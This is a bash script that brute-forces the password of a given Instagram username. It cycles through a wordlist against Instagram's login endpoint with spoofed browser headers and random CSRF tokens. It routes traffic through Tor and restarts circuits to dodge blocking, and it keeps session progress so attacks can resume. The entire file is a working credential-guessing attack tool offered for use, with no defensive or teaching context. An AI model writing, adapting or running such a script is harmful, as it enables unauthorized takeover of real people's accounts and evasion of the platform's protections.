#!/bin/bash
umask 0022
gen () {
token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33)
rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11)
}
if [ ! -f "$2" ]; then
echo "Non regular wordlist file"
exit 1
fi
if ! which curl &>/dev/null; then
echo "Install curl"
exit 2
fi
if ! which tor &>/dev/null; then
echo "Install tor"
exit 3
fi
token=""
rand=""
ft=$(cat "$2" | md5sum | cut -d ' ' -f1)
if [ -f "$1_$ft" ]; then
echo "Existing Session Found"
line_counter=$(sed '1q;d' "$1_$ft")
sedline=$line_counter'q;d'
line=$(sed "$sedline" "$2")
else
touch "$1_$ft"
echo "New Session"
line_counter=1;
sedline=$line_counter'q;d'
line=$(sed "$sedline" "$2")
fi
echo "Booting Up Tor"
tor --SOCKSPort "$3" 1>/dev/null &
pid=$!;
echo "Waiting Tor Circuit"
sleep 10
gen
url='https://www.instagram.com/accounts/login/ajax/'
ct='Content-Type: application/x-www-form-urlencoded'
ac='Accept: */*'
ae='Accept-Encoding: gzip, deflate, br'
ho='Host: www.instagram.com'
or='Origin: https://www.instagram.com'
ua='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15'
re='Referer: https://www.instagram.com/accounts/login/'
co='Connection: keep-alive'
req='X-Requested-With: XMLHttpRequest'
ig='X-IG-WWW-Claim: 0'
size=$(grep '.' -c "$2")
while :
if [[ "$line_counter" -gt "$size" ]]; then
echo "Password not in wordlist"
exit 5
fi
do
curl --socks5-hostname 127.0.0.1:"$3" -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$1&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed 1>response.txt "$url" 2>/dev/null
response=$(cat response.txt)
if [[ $response == *'authenticated":true'* || $response == *'checkpoint_required'* ]]; then
 echo "The Password is $line"
 exit 0
fi
if [[ $response == *'authenticated":false'* ]]; then
 line_counter=$((line_counter+1))
 echo $line_counter > "$1_$ft"
 sedline=$line_counter'q;d'
 line=$(sed $sedline "$2")
 echo "Trying $line_counter of $size"
else
kill -SIGHUP $pid
sleep 2
gen
fi
rm response.txt &>/dev/null
done
